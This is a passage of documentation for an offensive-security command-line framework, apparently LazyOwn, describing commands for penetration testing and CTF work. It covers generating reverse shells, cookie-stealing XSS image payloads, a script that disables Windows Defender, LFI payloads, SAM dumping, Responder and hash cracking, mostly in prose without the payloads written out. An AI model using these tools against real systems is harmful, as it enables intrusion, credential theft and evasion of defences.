script via <code>curl</code>. 5. Copies the <code>curl</code> command to
the clipboard.</p>
<p>Usage: createwinrevshell</p>
<p>:param line: This parameter is not used in the current
implementation. :type line: str :returns: None</p>
<p>Manual execution: 1. Creates or overwrites the file
<code>sessions/revshell.ps1</code> with the PowerShell reverse shell
script. 2. Displays the command to download and execute the script via
<code>curl</code>. 3. Copies the <code>curl</code> command to the
clipboard for easy use.</p>
<p>Dependencies: - PowerShell must be installed on the target system. -
<code>xclip</code> must be installed for copying the command to the
clipboard.</p>
<p>Example: createwinrevshell</p>
<p>Note: - Ensure that <code>lhost</code> and <code>lport</code> are set
before running this command. - The script will listen for incoming
connections on the specified <code>lport</code> and connect back to
<code>lhost</code>. - Adjust the <code>lhost</code> and
<code>lport</code> as needed for your specific environment.</p>
<h2 id="createhash">createhash</h2>
<p>Creates a <code>hash.txt</code> file in the <code>sessions</code>
directory with the specified hash value and analyzes it using
<code>Name-the-hash</code>.</p>
<p>This function performs the following actions: 1. Writes the provided
hash value to <code>sessions/hash.txt</code>. 2. Analyzes the hash value
using <code>Name-the-hash</code>.</p>
<p>Usage: createhash <hash></p>
<p>:param line: The hash value to be written to <code>hash.txt</code>
and analyzed. :type line: str :returns: None</p>
<p>Manual execution: 1. Creates or overwrites the file
<code>sessions/hash.txt</code> with the specified hash value. 2.
Analyzes the hash value using the <code>nth</code> command.</p>
<p>Dependencies: - <code>sessions/hash.txt</code> will be created in the
<code>sessions</code> directory. - <code>Name-the-hash</code> must be
installed and accessible via the command <code>nth</code>.</p>
<p>Example: createhash 5f4dcc3b5aa765d61d8327deb882cf99</p>
<p>Note: - Ensure the hash value is correct before running the analysis.
- The hash value should be provided as a single argument without extra
characters or spaces.</p>
<h2 id="createcredentials">createcredentials</h2>
<p>Creates a <code>credentials.txt</code> file in the
<code>sessions</code> directory with the specified username and
password.</p>
<p>This function performs the following actions: 1. Validates the input
line to ensure it contains a colon (<code>:</code>), indicating the
presence of both a username and password. 2. Writes the valid input to
<code>sessions/credentials.txt</code>.</p>
<p>Usage: createcredentials user:password</p>
<p>:param line: The input line containing the username and password in
the format <code>user:password</code>. :type line: str :returns:
None</p>
<p>Manual execution: 1. Creates or overwrites the file
<code>sessions/credentials.txt</code> with the specified username and
password.</p>
<p>Dependencies: - <code>sessions/credentials.txt</code> will be created
in the <code>sessions</code> directory.</p>
<p>Example: createcredentials
administrator:passwordadministrator123&amp;!</p>
<p>Note: - Ensure the input format is correct:
<code>user:password</code>. - The credentials should be properly
formatted with a colon separating the username and password.</p>
<h2 id="createcookie">createcookie</h2>
<p>Creates a <code>cookie.txt</code> file in the <code>sessions</code>
directory with the specified cookie value.</p>
<p>This function performs the following actions: 1. Extracts the cookie
value from the provided input line using a regular expression. 2. Writes
the extracted cookie value to <code>sessions/cookie.txt</code>.</p>
<p>Usage: createcookie cookie=user_data=valor_base64</p>
<p>:param line: The input line containing the cookie value in the format
<code>cookie=value</code>. :type line: str :returns: None</p>
<p>Manual execution: 1. Creates or overwrites the file
<code>sessions/cookie.txt</code> with the extracted cookie value.</p>
<p>Dependencies: - <code>sessions/cookie.txt</code> will be created in
the <code>sessions</code> directory.</p>
<p>Example: createcookie cookie=user_data=valor_base64</p>
<p>Note: - Ensure the input format is correct:
<code>cookie=value</code>. - The cookie value should be properly encoded
and formatted as needed.</p>
<h2 id="download_resources">download_resources</h2>
<p>Downloads resources into the <code>sessions</code> directory.</p>
<p>This function performs the following actions: 1. Changes to the
<code>sessions</code> directory and executes
<code>download_resources.sh</code> to download required resources.</p>
<p>Usage: download_resources</p>
<p>:param line: Not used in this function. :type line: str :returns:
None</p>
<p>Manual execution: 1. Runs the <code>download_resources.sh</code>
script in the <code>sessions</code> directory to download necessary
resources.</p>
<p>Dependencies: - <code>download_resources.sh</code> must be present in
the <code>sessions</code> directory.</p>
<p>Example: download_resources</p>
<p>Note: - Ensure that the <code>download_resources.sh</code> script is
present in the <code>sessions</code> directory and is executable. -
After running this command, you can use the <code>www</code> command as
indicated by the printed message.</p>
<h2 id="download_exploit">download_exploit</h2>
<p>Downloads and sets up exploits in the
<code>external/.exploits/</code> directory and starts a web server to
serve the files.</p>
<p>This function performs the following actions: 1. Changes to the
<code>external</code> directory and executes
<code>install_external.sh</code> to install necessary components or
exploits. 2. Displays the IP addresses associated with network
interfaces and copies the IP address of <code>tun0</code> to the
clipboard. 3. Lists the contents of the <code>external/.exploit</code>
directory and starts a web server on port 8443 to serve the files in
that directory. 4. Prints a message indicating the server’s status and
the port it’s running on.</p>
<p>Usage: download_exploit</p>
<p>:param line: Not used in this function. :type line: str :returns:
None</p>
<p>Manual execution: 1. Runs the <code>install_external.sh</code> script
to set up necessary components or exploits. 2. Displays network
interface IP addresses and copies the IP address of <code>tun0</code> to
the clipboard. 3. Lists the contents of <code>external/.exploit</code>
directory. 4. Starts a Python HTTP server on port 8443 in the
<code>external/.exploit</code> directory to serve files.</p>
<p>Dependencies: - <code>install_external.sh</code> must be present in
the <code>external</code> directory. - <code>xclip</code> must be
installed for clipboard operations. - Python 3 must be installed to run
the HTTP server.</p>
<p>Example: download_exploit</p>
<p>Note: - Ensure that the <code>install_external.sh</code> script is
correctly configured and present in the <code>external</code> directory.
- The HTTP server will be accessible on port 8443. - The function
assumes the presence of <code>external/.exploit</code> directory and
serves files from there.</p>
<h2 id="dirsearch">dirsearch</h2>
<p>Runs the <code>dirsearch</code> tool to perform directory and file
enumeration on a specified URL.</p>
<p>This function executes <code>dirsearch</code> to scan a given URL for
directories and files, while excluding specific HTTP status codes from
the results. If <code>dirsearch</code> is not installed, the function
will attempt to install it before running the scan.</p>
<p>Usage: dirsearch <url></p>
<p>:param line: Not used in this function. The URL is provided via the
<code>url</code> parameter. :type line: str :returns: None</p>
<p>Manual execution: 1. If <code>dirsearch</code> is present, the
command <code>dirsearch -u &lt;url&gt; -x 403,404,400</code> is
executed. 2. If <code>dirsearch</code> is not present, the function
installs <code>dirsearch</code> using
<code>sudo apt install dirsearch -y</code> and then runs the
command.</p>
<p>Dependencies: - <code>dirsearch</code> must be installed. If not
present, it will be installed using <code>sudo apt</code>. - Ensure the
URL is set via the <code>url</code> parameter before calling this
function.</p>
<p>Example: dirsearch http://example.com/</p>
<p>Note: - Ensure that the <code>url</code> parameter is set before
calling this function. - The <code>-x</code> option specifies HTTP
status codes to exclude from the results (e.g., 403, 404, 400). - The
function will attempt to install <code>dirsearch</code> if it is not
already installed.</p>
<h2 id="john2hash">john2hash</h2>
<p>Runs John the Ripper with a specified wordlist and options.</p>
<p>This function executes John the Ripper to crack hashes using the
specified wordlist and additional options. If no additional options are
provided, it will attempt to display cracked hashes.</p>
<p>Usage: john2hash <options></p>
<p>:param line: Optional arguments to be passed to John the Ripper
(e.g., <code>--format=Raw-SHA512</code>). If not provided, the function
will default to showing the cracked hashes. :type line: str :returns:
None</p>
<p>Manual execution: 1. If <code>line</code> is provided, the command
<code>sudo john sessions/hash.txt --wordlist=&lt;wordlist&gt; &lt;options&gt;</code>
is executed. 2. If <code>line</code> is not provided, the command
<code>sudo john sessions/hash.txt --wordlist=&lt;wordlist&gt;</code> is
executed to display the cracked hashes.</p>
<p>Dependencies: - John the Ripper must be installed and available in
the system’s PATH. - Ensure the wordlist file exists at the specified
path. - The <code>sessions/hash.txt</code> file must contain the hashes
to be cracked.</p>
<p>Example: john2hash –format=Raw-SHA512 # If <code>wordlist</code> is
set to <code>/usr/share/wordlists/rockyou.txt</code>, the command
executed will be
<code>sudo john sessions/hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA512</code>.</p>
<p>Note: - Ensure that the <code>wordlist</code> parameter is set before
calling this function. - Provide the necessary options as a string
argument (e.g., <code>--format=Raw-SHA512</code>) if needed. - If no
options are provided, the function defaults to showing the cracked
hashes.</p>
<h2 id="hashcat">hashcat</h2>
<p>Runs Hashcat with specified attack mode and hash type using a
wordlist.</p>
<p>This function executes the Hashcat tool with the specified mode and
wordlist file. The hash value to be cracked should be provided as an
argument.</p>
<p>Usage: hashcat <mode></p>
<p>:param line: The hash type or mode to be used with Hashcat (e.g., 0
for MD5). This is a required argument. :type line: str :returns:
None</p>
<p>Manual execution: 1. The command
<code>hashcat -a 0 -m &lt;mode&gt; &lt;hash&gt; &lt;wordlist&gt;</code>
is executed, where <code>&lt;mode&gt;</code> is the hash type,
<code>&lt;hash&gt;</code> is the hash to be cracked, and
<code>&lt;wordlist&gt;</code> is the path to the wordlist file.</p>
<p>Dependencies: - Hashcat must be installed and available in the
system’s PATH. - Ensure the wordlist file exists at the specified
path.</p>
<p>Example: hashcat 0 # If <code>wordlist</code> is set to
<code>/usr/share/wordlists/rockyou.txt</code> and <code>line</code> is
<code>0</code>, the command executed will be
<code>hashcat -a 0 -m 0 /usr/share/wordlists/rockyou.txt</code>.</p>
<p>Note: - Ensure that the <code>wordlist</code> parameter is set before
calling this function. - The hash to be cracked must be passed as an
argument when calling the function. - Replace <code>&lt;mode&gt;</code>
with the appropriate Hashcat mode number (e.g., <code>0</code> for MD5,
<code>1000</code> for NTLM).</p>
<h2 id="complete_hashcat">complete_hashcat</h2>
<p>Complete mode options and file paths for the sessions/hash.txt</p>
<h2 id="responder">responder</h2>
<p>Runs Responder on a specified network interface with elevated
privileges.</p>
<p>This function executes the Responder tool with <code>sudo</code> on
the network interface provided in the <code>device</code> parameter.</p>
<p>Usage: responder</p>
<p>:param line: This parameter is not used in the function but is
included for consistency with other command methods. :type line: str
:returns: None</p>
<p>Manual execution: 1. The command
<code>sudo responder -I &lt;device&gt;</code> is executed, where
<code>&lt;device&gt;</code> is the network interface specified by the
user.</p>
<p>Dependencies: - The function relies on <code>sudo</code> to run
Responder with root privileges. - Ensure that Responder is installed and
available in the system’s PATH.</p>
<p>Example: responder # If <code>device</code> is set to
<code>tun0</code>, the command executed will be
<code>sudo responder -I tun0</code>.</p>
<p>Note: - Ensure that the <code>device</code> parameter is set before
calling this function. - Replace <code>&lt;device&gt;</code> with the
appropriate network interface, such as <code>tun0</code>,
<code>eth0</code>, etc. - Running Responder requires root privileges, so
make sure the user running the command has the necessary
permissions.</p>
<h2 id="ip">ip</h2>
<p>Displays IP addresses of network interfaces and copies the IP address
from the <code>tun0</code> interface to the clipboard.</p>
<p>This function performs the following tasks: 1. Displays IP addresses
for all network interfaces using <code>ip a show scope global</code> and
<code>awk</code>. 2. Copies the IP address from the <code>tun0</code>
interface to the clipboard using <code>xclip</code>.</p>
<p>Usage: ip</p>
<p>:param line: This parameter is not used in the function but is
included for consistency with other command methods. :type line: str
:returns: None</p>
<p>Manual execution: 1. The command
<code>ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [[96m" iface"[0m] "a[1] }'</code>
is executed to display the IP addresses of all network interfaces. 2.
The IP address of the <code>tun0</code> interface is copied to the
clipboard using the command
<code>ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip</code>.</p>
<p>Dependencies: - The function relies on <code>awk</code>,
<code>grep</code>, <code>cut</code>, and <code>xclip</code> to process
and copy the IP address.</p>
<p>Example: ip # This will display IP addresses for all network
interfaces and copy the IP address from <code>tun0</code> to the
clipboard.</p>
<p>Note: Ensure that the <code>tun0</code> interface exists and has an
IP address assigned. If <code>tun0</code> is not present or has no IP
address, the clipboard will not be updated.</p>
<h2 id="rhost">rhost</h2>
<p>Copies the remote host (rhost) to the clipboard and updates the
command prompt.</p>
<p>This function performs two tasks: 1. It copies the <code>rhost</code>
parameter to the clipboard if it is valid. 2. It updates the command
prompt to include the <code>rhost</code> and the current working
directory.</p>
<p>Usage: rhost <a href="#clean">clean</a></p>
<p>:param line: An optional argument that determines the behavior of the
function: - If ‘clean’, it resets the command prompt to its default
format. - If any other value, it updates the command prompt to include
the <code>rhost</code> and current working directory. :type line: str
:returns: None</p>
<p>Manual execution: 1. If <code>line</code> is ‘clean’: - The command
prompt is reset to its default format. 2. If <code>line</code> is any
other value: - The command prompt is updated to show the
<code>rhost</code> and the current working directory. - The
<code>rhost</code> is copied to the clipboard using
<code>xclip</code>.</p>
<p>Dependencies: - The script uses <code>xclip</code> to copy the
<code>rhost</code> to the clipboard.</p>
<p>Example: rhost # This will copy the current <code>rhost</code> to the
clipboard and update the prompt.</p>
<p>rhost clean # This will reset the command prompt to its default
format.</p>
<p>Note: Ensure that the <code>rhost</code> is valid by checking it with
the <code>check_rhost</code> function before copying it to the
clipboard.</p>
<h2 id="banner">banner</h2>
<p>Show the banner</p>
<h2 id="py3ttyup">py3ttyup</h2>
<p>Copies a Python reverse shell command to the clipboard.</p>
<p>This function generates a Python command that uses the
<code>pty</code> module to spawn a new shell and copies it to the
clipboard. This is typically used for creating a TTY shell in a reverse
shell situation.</p>
<p>Usage: py3ttyup</p>
<p>:param line: This parameter is not used in the function. :type line:
str :returns: None</p>
<p>Manual execution: 1. The function creates a Python command with
<code>pty.spawn</code> to open a shell. 2. The command is copied to the
clipboard using <code>xclip</code>. 3. A message is printed to inform
the user that the command has been copied.</p>
<p>Dependencies: - The script uses <code>xclip</code> to copy the
command to the clipboard.</p>
<p>Example: py3ttyup # This will copy the Python command
<code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code> to the
clipboard.</p>
<p>Note: This command is often used in scenarios where you need a more
interactive shell from a reverse shell connection.</p>
<h2 id="rev">rev</h2>
<p>Copies a reverse shell payload to the clipboard.</p>
<p>This function generates a reverse shell command that connects back to
the specified host and port, and copies it to the clipboard. It also
provides a way to execute the payload via a PHP-based web shell.</p>
<p>Usage: rev</p>
<p>:param line: This parameter is not used in the function. :type line:
str :returns: None</p>
<p>Manual execution: 1. Ensure that <code>lhost</code>,
<code>lport</code>, and <code>rhost</code> parameters are set. 2. The
function generates a reverse shell command in Bash and prints
instructions for using the payload. 3. It also provides an example URL
and PHP code snippet that decodes and executes the base64-encoded
payload. 4. The reverse shell command is copied to the clipboard using
<code>xclip</code>.</p>
<p>Dependencies: - The script uses <code>xclip</code> to copy the
command to the clipboard. - Base64 encoding is used to obfuscate the
payload.</p>
<p>Example: rev # This will copy a reverse shell command to the
clipboard and display instructions for its use.</p>
<h2 id="img2cookie">img2cookie</h2>
<p>Copies a malicious image tag payload to the clipboard.</p>
<p>This function crafts and copies two different image tag payloads
designed to steal cookies from a target’s browser. The payloads use
JavaScript to send cookies to a specified host and port. The user is
prompted to select which payload to copy to the clipboard.</p>
<p>Usage: img2cookie</p>
<p>:param line: This parameter is not used in the function. :type line:
str :returns: None</p>
<p>Manual execution: 1. Ensure that <code>lhost</code>,
<code>lport</code>, and <code>rhost</code> parameters are set. 2. The
function generates two payloads: - Payload 1: A script that sends
cookies to the specified host and port. - Payload 2: An image tag with
an <code>onerror</code> event that fetches cookies and sends them to the
specified host and port using Base64 encoding. 3. The user is prompted
to choose between the two payloads, which are then copied to the
clipboard.</p>
<p>Dependencies: - The script uses <code>xclip</code> to copy the
payloads to the clipboard. - Ensure that <code>lhost</code>,
<code>lport</code>, and <code>rhost</code> parameters are set with
appropriate values.</p>
<p>Example: img2cookie # This will prompt you to select between two
payloads. The chosen payload will be copied to the clipboard.</p>
<h2 id="disableav">disableav</h2>
<p>Creates a Visual Basic Script (VBS) to attempt to disable antivirus
settings.</p>
<p>This function generates a VBS script designed to modify Windows
Registry settings and run PowerShell commands to disable various Windows
Defender antivirus features.</p>
<p>Usage: disableav</p>
<p>:param line: This parameter is not used in the function. :type line:
str :returns: None</p>
<p>Manual execution: 1. The function writes a VBS script to a file named
<code>aav.vbs</code> in the <code>sessions</code> directory. 2. The
script: - Elevates its privileges if not already running as an
administrator. - Modifies Windows Registry settings to disable various
Windows Defender features. - Outputs PowerShell commands to disable
additional Windows Defender settings.</p>
<p>The VBS script: - Uses <code>WScript.Shell</code> to modify the
Windows Registry for disabling Windows Defender. - Calls PowerShell
commands to further disable antivirus features.</p>
<p>Dependencies: - The script must be executed on a Windows system where
you have administrative privileges. - Ensure you have appropriate
permissions to modify Windows Registry settings.</p>
<p>Example: disableav # This will create the <code>aav.vbs</code> file
with the specified content in the <code>sessions</code> directory.</p>
<h2 id="conptyshell">conptyshell</h2>
<p>Downloads ConPtyShell and prepares a PowerShell command for remote
access.</p>
<p>This function downloads the ConPtyShell PowerShell script and ZIP
archive to the <code>sessions</code> directory and copies a PowerShell
command to the clipboard for easy execution.</p>
<p>Usage: conptyshell</p>
<p>:param line: This parameter is not used in the function. The required
host and port are retrieved from the <code>params</code> dictionary.
:type line: str :returns: None</p>
<p>Manual execution: 1. Ensure that the <code>lhost</code> and
<code>lport</code> parameters are set with the local host and port for
the reverse shell. 2. The function downloads
<code>Invoke-ConPtyShell.ps1</code> and <code>ConPtyShell.zip</code> to
the <code>sessions</code> directory. 3. Constructs a PowerShell command
to run <code>Invoke-ConPtyShell.ps1</code> with the specified local IP
and port. 4. Copies the constructed command to the clipboard using
<code>xclip</code>.</p>
<p>The constructed PowerShell command: - Uses
<code>Invoke-ConPtyShell.ps1</code> to establish a reverse shell
connection to the specified <code>lhost</code> and <code>lport</code>. -
Sets the PowerShell execution policy to bypass and specifies the
dimensions of the terminal window.</p>
<p>Dependencies: - <code>wget</code>: For downloading files from the
internet. - <code>xclip</code>: For copying commands to the clipboard. -
Ensure <code>ConPtyShell</code> script and ZIP are compatible with your
environment.</p>
<p>Example: conptyshell # This will download the required files and copy
the PowerShell command to the clipboard.</p>
<h2 id="pwncatcs">pwncatcs</h2>
<p>Runs <code>pwncat-cs</code> with the specified port for
listening.</p>
<p>This function starts a <code>pwncat-cs</code> listener on the
specified local port. It can use a port defined in the
<code>lport</code> parameter or a port provided as an argument.</p>
<p>Usage: pwncatcs <port></p>
<p>:param line: The port number to use for the <code>pwncat-cs</code>
listener. If not provided, it defaults to the <code>lport</code>
parameter. :type line: str :returns: None</p>
<p>Manual execution: 1. Ensure that <code>pwncat-cs</code> is installed
and accessible from your command line. 2. The port number can either be
provided as an argument or be set in the <code>lport</code> parameter of
the function. 3. Run the function to start <code>pwncat-cs</code> on the
specified port.</p>
<p>If no port is provided as an argument, the function will use the port
specified in the <code>lport</code> parameter. If a port is provided, it
overrides the <code>lport</code> value.</p>
<p>After starting the listener, the function prints a message indicating
that <code>pwncat-cs</code> is running on the specified port and another
message when the session is closed.</p>
<p>Dependencies: - <code>pwncat-cs</code>: A tool used for creating
reverse shells or bind shells.</p>
<h2 id="find">find</h2>
<p>Automates command execution based on a list of aliases and
commands.</p>
<ol type="1">
<li>Displays available aliases and their commands.</li>
<li>Asks the user if they want to execute a specific command.</li>
<li>If confirmed, displays the alias and command with a number.</li>
<li>Executes the command and copies it to the clipboard.</li>
</ol>
<p>:param line: The command line input containing the list of alias and
command pairs. :type line: str :returns: None</p>
<p>Manual execution: To manually run these tasks, you would need to: -
Prepare the list of alias and command pairs in the format: “alias
command”. - Provide this list as input to the function. - Confirm the
execution of the desired command when prompted. - Manually copy the
command to the clipboard if needed.</p>
<p>Note: Ensure <code>xclip</code> is installed and properly configured
to use clipboard functionalities.</p>
<h2 id="sh">sh</h2>
<p>execute some command direct in shell to avoid exit LazyOwn ;)</p>
<h2 id="pwd">pwd</h2>
<p>‘echo -e “[[34m” &amp;&amp; ls &amp;&amp; echo -en “[0m”’</p>
<h2 id="qa">qa</h2>
<p>Exit fast without confirmation</p>
<h2 id="ignorearp">ignorearp</h2>
<p>echo 1 &gt; /proc/sys/net/ipv4/conf/all/arp_ignore</p>
<h2 id="ignoreicmp">ignoreicmp</h2>
<p>echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</p>
<h2 id="acknowledgearp">acknowledgearp</h2>
<p>echo 0 &gt; /proc/sys/net/ipv4/conf/all/arp_ignore</p>
<h2 id="acknowledgeicmp">acknowledgeicmp</h2>
<p>echo 0 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</p>
<h2 id="clock">clock</h2>
<p>Displays the current date and time, and runs a custom shell
script.</p>
<p>This function performs the following actions: 1. Constructs a command
to get the current date and time in a specified format. 2. Uses
<code>figlet</code> to display the current date and time in a large
ASCII text format. 3. Runs a custom shell script (<code>cal.sh</code>)
to display additional information or perform further actions related to
the clock.</p>
<p>Usage: clock</p>
<p>:param line: This parameter is not used in the function. :type line:
str :returns: None</p>
<p>Manual execution: To manually use this function: 1. Ensure that
<code>figlet</code> is installed on your system for displaying text in
large ASCII format. 2. Make sure <code>cal.sh</code> exists in the
<code>modules</code> directory and is executable. 3. Run the function to
see the current date and time displayed in large ASCII text, followed by
the execution of <code>cal.sh</code>.</p>
<p>Note: The function sets the terminal color to white before displaying
the date and time, then sets it to green before running the
<code>cal.sh</code> script. Finally, it resets the terminal color.</p>
<p>Dependencies: - <code>figlet</code>: For displaying text in large
ASCII format. - <code>cal.sh</code>: A custom shell script located in
the <code>modules</code> directory.</p>
<h2 id="ports">ports</h2>
<p>Lists all open TCP and UDP ports on the local system.</p>
<p>This function performs the following actions: 1. Calls the
<code>get_open_ports</code> function to retrieve lists of open TCP and
UDP ports. 2. Prints a header for open TCP ports. 3. Iterates over the
list of open TCP ports, printing each IP address and port number. 4.
Prints a header for open UDP ports. 5. Iterates over the list of open
UDP ports, printing each IP address and port number.</p>
<p>Usage: ports</p>
<p>:param line: This parameter is not used in the function. :type line:
str :returns: None</p>
<p>Manual execution: To manually use this function: 1. Ensure the
<code>get_open_ports</code> function is defined and properly implemented
to return lists of open TCP and UDP ports. 2. Run the function to
display open TCP and UDP ports on the local system.</p>
<p>Note: The <code>get_open_ports</code> function should return two
lists of tuples: one for TCP ports and one for UDP ports. Each tuple
should contain an IP address and a port number.</p>
<h2 id="ssh">ssh</h2>
<p>Connects to an SSH host using credentials from a file and a specified
port.</p>
<p>This function performs the following actions: 1. Retrieves the remote
host (<code>rhost</code>) from the parameters. 2. Checks if the
<code>rhost</code> is valid using the <code>check_rhost</code> function.
3. Sets the SSH port to the value provided in the <code>line</code>
parameter. 4. Checks if the <code>credentials.txt</code> file exists in
the <code>./sessions</code> directory. 5. Reads credentials (username
and password) from the <code>credentials.txt</code> file, where each
line is formatted as <code>user:password</code>. 6. Constructs and
executes an SSH command using <code>sshpass</code> to handle password
authentication and <code>ssh</code> to initiate the connection. 7.
Displays the SSH command being executed.</p>
<p>Usage: ssh <port></p>
<p>:param line: The port number to use for the SSH connection. :type
line: str :returns: None</p>
<p>Manual execution: To manually use this function: 1. Ensure
<code>sessions/credentials.txt</code> exists and contains valid SSH
credentials in the format <code>user:password</code>. 2. Run the
function with the port number as an argument. 3. The function will
attempt to connect to the SSH host using each set of credentials and the
specified port.</p>
<p>Note: Ensure <code>sshpass</code> is installed on your system for
password-based SSH authentication. If <code>sshpass</code> is not
available, you may need to install it or use an alternative method for
SSH authentication.</p>
<h2 id="cports">cports</h2>
<p>Generates a command to display TCP and UDP ports and copies it to the
clipboard.</p>
<p>This function performs the following actions: 1. Defines a command to
display TCP and UDP ports from <code>/proc/net/tcp</code> and
<code>/proc/net/udp</code>, respectively. 2. The command extracts and
formats IP addresses and port numbers from these files. 3. Prints the
generated command to the console for verification. 4. Copies the command
to the clipboard using <code>xclip</code>.</p>
<p>Usage: cports # Generates the command and copies it to the
clipboard</p>
<p>:param line: This parameter is not used in this function. :type line:
str :returns: None</p>
<p>Manual execution: To manually use this function: 1. Run the function
to print the command and copy it to the clipboard. 2. The command can be
pasted into a terminal to display TCP and UDP ports.</p>
<p>Note: Ensure <code>xclip</code> is installed on your system for
copying to the clipboard. If <code>xclip</code> is not available, you
may need to install it or use an alternative method for copying to the
clipboard.</p>
<h2 id="vpn">vpn</h2>
<p>Connect to a VPN by selecting from available .ovpn files.</p>
<p>This function performs the following actions: 1. Lists all
<code>.ovpn</code> files in the current directory, sorted
alphabetically. 2. Handles cases with and without arguments: - Without
arguments: Lists available <code>.ovpn</code> files and prompts the user
to select one by number. - With a single argument: Treats the argument
as a number and attempts to connect to the corresponding
<code>.ovpn</code> file. 3. Connects to the selected <code>.ovpn</code>
file using <code>openvpn</code> and displays appropriate messages. 4.
Handles invalid input with error messages.</p>
<p>Usage: vpn # List available .ovpn files and select one to connect to
vpn <number> # Connect directly to the .ovpn file corresponding to the
number</p>
<p>:param line: The number of the .ovpn file to connect to, or an empty
string to list available files. :type line: str :returns: None</p>
<p>Manual execution: To manually use this function: 1. Run the function
with no arguments to list available <code>.ovpn</code> files. 2. Choose
a file by entering the corresponding number. 3. Alternatively, run the
function with a number argument to connect directly to the specified
<code>.ovpn</code> file.</p>
<p>Note: Ensure you have the necessary permissions and the
<code>openvpn</code> command is available on your system.</p>
<h2 id="id_rsa">id_rsa</h2>
<p>Create an SSH private key file and connect to a remote host using
SSH.</p>
<p>This function performs the following actions: 1. Checks if the
provided remote host (<code>rhost</code>) is valid. 2. Verifies that a
username is provided as an argument. 3. Creates an SSH private key file
in the <code>sessions</code> directory with a name based on the provided
username. 4. Opens the created file in the <code>nano</code> text editor
for the user to paste the private key. 5. Sets the file permissions to
read-only for the owner (400). 6. Connects to the remote host via SSH
using the created private key. 7. Displays a warning message when the
SSH connection is closed.</p>
<p>Usage: id_rsa <username></p>
<p>:param line: The username for SSH connection and private key file
naming. :type line: str :returns: None</p>
<p>Manual execution: To manually use this function: 1. Run the function
with the username argument, e.g., <code>id_rsa myuser</code>. 2. Paste
the private key into the <code>nano</code> editor when prompted. 3. Save
and exit the editor. 4. The SSH connection will be established using the
private key.</p>
<p>Note: Ensure you have the necessary permissions to create files and
connect via SSH.</p>
<h2 id="www">www</h2>
<p>Start a web server using Python 3 and display relevant network
information.</p>
<p>This function performs the following actions: 1. Displays global
network interfaces and their IP addresses. 2. Copies the IP address of
the <code>tun0</code> interface to the clipboard. 3. Displays the
current working directory and contents of the <code>sessions</code>
directory. 4. Starts a Python 3 HTTP server on port 80 in the
<code>sessions</code> directory. 5. Displays a message indicating that
the web server is running and will show the shutdown message when
stopped.</p>
<p>Usage: www</p>
<p>:param line: This parameter is not used in the function. :type line:
str :returns: None</p>
<p>Manual execution: To manually use this function, run it to start the
web server and follow the on-screen instructions to see the network
information and server status.</p>
<p>Note: Ensure you have <code>xclip</code> installed for clipboard
operations and have the necessary permissions to run the HTTP
server.</p>
<h2 id="wrapper">wrapper</h2>
<p>Copy payloads to clipboard for Local File Inclusion (LFI)
attacks.</p>
<p>This function provides three payload options for Local File Inclusion
(LFI) attacks and copies the selected payload to the clipboard using
<code>xclip</code>. The user is prompted to choose which payload to
copy.</p>
<p>Usage: wrapper</p>
<p>:param line: This parameter is not used in the function. :type line:
str :returns: None</p>
<p>Manual execution: To manually use this function, run it and follow
the prompts to select one of the three predefined payloads. The selected
payload will be copied to the clipboard.</p>
<p>Note: Ensure <code>xclip</code> is installed on your system for
clipboard operations.</p>
<h2 id="samrdump">samrdump</h2>
<p>Run <code>impacket-samrdump</code> to dump SAM data from specified
ports.</p>
<p>This function executes <code>impacket-samrdump</code> to retrieve SAM
data from the target host on ports 139 and 445. It first checks if the
<code>rhost</code> parameter is valid, and if so, it runs the command
for both ports.</p>
<p>Usage: samrdump <target_host></p>
<p>:param line: The target host to dump SAM data from. :type line: str
:returns: None</p>
<p>Manual execution: To manually run this task, specify the target host.
The function will attempt to dump SAM data from the host on ports 139
and 445. impacket-samrdump -port 445 10.10.10.10 Note: Ensure that
<code>impacket-samrdump</code> is installed and properly configured on
your system.</p>
<h2 id="urlencode">urlencode</h2>
<p>Encode a string for URL.</p>
<p>This function takes a string as input, encodes it for URL
compatibility using the <code>quote</code> function, and prints the
encoded result.</p>
<p>Usage: urlencode <string_to_encode></p>
<p>:param line: The string to encode for URL. :type line: str :returns:
None</p>
<p>Manual execution: To manually run this task, provide a string to be
URL-encoded as an argument. The function will encode it and print the
result.</p>
<p>Note: If no input is provided or the input is only whitespace, an
error message will be displayed.</p>
<h2 id="urldecode">urldecode</h2>
<p>Decode a URL-encoded string.</p>
<p>This function takes a URL-encoded string as input, decodes it using
the <code>unquote</code> function, and prints the decoded result.</p>
<p>Usage: urldecode <url_encoded_string></p>
<p>:param line: The URL-encoded string to decode. :type line: str
:returns: None</p>
<p>Manual execution: To manually run this task, provide a URL-encoded
string as an argument. The function will decode it and print the
result.</p>
<p>Note: If no input is provided or the input is only whitespace, an
error message will be displayed.</p>
<h2 id="lynis">lynis</h2>
<p>Performs a Lynis audit on the specified remote system.</p>
<p>This function executes the <code>modules/lazylynis.sh</code> script
with the target host defined in the <code>rhost</code> parameter. It is
used to perform a security audit of the remote system using Lynis.</p>
<p>Usage: lynis</p>
<p>:param line: This parameter is not used in the current
implementation. :type line: str :returns: None</p>
<p>Manual execution: To manually run this task, ensure that the
<code>modules/lazylynis.sh</code> script is available and executable.
Provide the target host in the format <code>lynis</code>. sudo lynis
audit system remote 10.10.10.10 more info check modules/lazylynis.sh
Note: The function assumes that <code>rhost</code> is a valid host
address. If <code>rhost</code> is not valid, it will print an error
message. For more details, check <code>modules/lazylynis.sh</code>.</p>
<h2 id="snmpcheck">snmpcheck</h2>
<p>Performs an SNMP check on the specified target host.</p>
<p>This function executes the <code>snmp-check</code> command against
the target host defined in the <code>rhost</code> parameter.</p>
<p>Usage: snmpcheck</p>
<p>:param line: This parameter is not used in the current
implementation. :type line: str :returns: None</p>
<p>Manual execution: To manually run this task, ensure that
<code>snmp-check</code> is installed and provide a target host in the
format <code>snmpcheck</code>. snmp-check 10.10.10.10 Note: The function
assumes that <code>rhost</code> is a valid host address. If
<code>rhost</code> is not valid, it will print an error message.</p>
<h2 id="encode">encode</h2>
<p>Encodes a string using the specified shift value and substitution
key.</p>
<p>This function encodes the given string by applying a shift value and
a substitution key.</p>
<p>Usage: encode <shift_value> <substitution_key> <string></p>
<p>:param line: The input string containing the shift value,
